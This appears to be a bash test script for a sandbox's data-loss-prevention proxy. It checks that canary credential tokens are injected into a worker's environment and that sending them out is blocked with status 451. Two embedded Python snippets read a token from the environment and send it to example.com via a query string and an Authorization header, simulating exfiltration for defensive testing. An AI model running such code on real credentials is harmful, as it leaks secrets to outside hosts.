#!/usr/bin/env bash
# ============================================================================
# t_dlp_canary.sh — DLP canary tokens trip the proxy
#
# When DLP is enabled, the sandbox injects per-session random "canary"
# tokens into the worker's environment as `CANISTER_CANARY_GITHUB_PAT`,
# `CANISTER_CANARY_NPM_TOKEN`, and `CANISTER_CANARY_AWS_ACCESS_KEY`. The
# proxy holds the same values in its scanner. A worker that reads any of
# them and tries to send them upstream — even to an allow-listed host —
# is caught with detector `canary_token` and blocked (451).
#
# Canaries are uniquely valuable signals because they cannot generate
# false positives: their exact bytes do not exist outside this process.
# Any echo upstream is by definition an exfil attempt.
# ============================================================================

source "$(dirname "$0")/lib.sh"
require_user_namespaces
require_pasta
require_python3
header "DLP canary tokens are caught when shipped upstream"

CONFIG=$(tmpconfig <<'EOF'
[filesystem]
allow = ["/usr/lib", "/usr/bin", "/usr/local", "/lib", "/lib64", "/tmp"]

[network]
egress = "proxy-only"
allow_domains = ["example.com"]

[process]
env_passthrough = ["PATH", "HOME", "LANG", "TERM"]

[syscalls]
EOF
)
_TMPFILES+=("$CONFIG")

# ---- Test 1: canary tokens are present in the worker env ----
# Pin the injection contract — if the env vars stop appearing, every
# canary-based defense silently fails. This test is the canary on the
# canary.
begin_test "canary env vars are injected into the worker"
run_can run --recipe "$CONFIG" -- sh -c '
    for v in CANISTER_CANARY_GITHUB_PAT CANISTER_CANARY_NPM_TOKEN CANISTER_CANARY_AWS_ACCESS_KEY; do
        val=$(eval echo \$$v)
        if [ -z "$val" ]; then
            echo "MISSING $v"
            exit 1
        fi
        echo "PRESENT $v len=${#val}"
    done
'
case "$RUN_STDOUT" in
    *"PRESENT CANISTER_CANARY_GITHUB_PAT"*"PRESENT CANISTER_CANARY_NPM_TOKEN"*"PRESENT CANISTER_CANARY_AWS_ACCESS_KEY"*)
        pass
        ;;
    *)
        fail "expected all three canary env vars; got: $RUN_STDOUT"
        ;;
esac

# ---- Test 2: a worker that exfiltrates the GitHub PAT canary is blocked ----
# The token is in the env, the host is in `allow_domains`, but the canary
# byte sequence in the URL trips DLP and returns 451. detector=canary_token
# distinguishes this from a regex match on `ghp_…` (the canary happens to
# share the prefix; the scanner records it as `canary_token` because the
# canary lookup runs first in `PatternSet::scan`).
begin_test "exfilling canary GithubPat via query string is blocked"
run_can run --recipe "$CONFIG" -- python3 -c '
import os, urllib.request, urllib.error
canary = os.environ["CANISTER_CANARY_GITHUB_PAT"]
proxy = os.environ.get("HTTP_PROXY")
opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
req = urllib.request.Request(f"http://example.com/?leak={canary}")
try:
    resp = opener.open(req, timeout=5)
    print(f"UNEXPECTED status={resp.status}")
except urllib.error.HTTPError as e:
    err = e.headers.get("x-canister-error", "?")
    det = e.headers.get("x-canister-dlp-detector", "?")
    print(f"BLOCKED status={e.code} err={err} detector={det}")
except Exception as e:
    print(f"ERR error={e}")
'
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"err=dlp-blocked"*"canary_token"*|*"BLOCKED status=451"*"err=dlp-blocked"*"github_pat"*)
        # Either detector ID is acceptable evidence — both fire for the
        # same byte sequence because the canary token happens to be a
        # syntactically-valid `ghp_…` value. What matters is the 451 +
        # dlp-blocked envelope.
        pass
        ;;
    *)
        fail "expected 451 dlp-blocked for canary exfil; got: $RUN_STDOUT"
        ;;
esac

# ---- Test 3: a worker that exfiltrates the canary via Authorization ----
begin_test "exfilling canary via Authorization header is blocked"
run_can run --recipe "$CONFIG" -- python3 -c '
import os, urllib.request, urllib.error
canary = os.environ["CANISTER_CANARY_AWS_ACCESS_KEY"]
proxy = os.environ.get("HTTP_PROXY")
opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
req = urllib.request.Request("http://example.com/", headers={"Authorization": f"AWS {canary}"})
try:
    resp = opener.open(req, timeout=5)
    print(f"UNEXPECTED status={resp.status}")
except urllib.error.HTTPError as e:
    err = e.headers.get("x-canister-error", "?")
    det = e.headers.get("x-canister-dlp-detector", "?")
    print(f"BLOCKED status={e.code} err={err} detector={det}")
except Exception as e:
    print(f"ERR error={e}")
'
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"err=dlp-blocked"*)
        pass
        ;;
    *)
        fail "expected 451 dlp-blocked for AWS-canary header exfil; got: $RUN_STDOUT"
        ;;
esac

summary
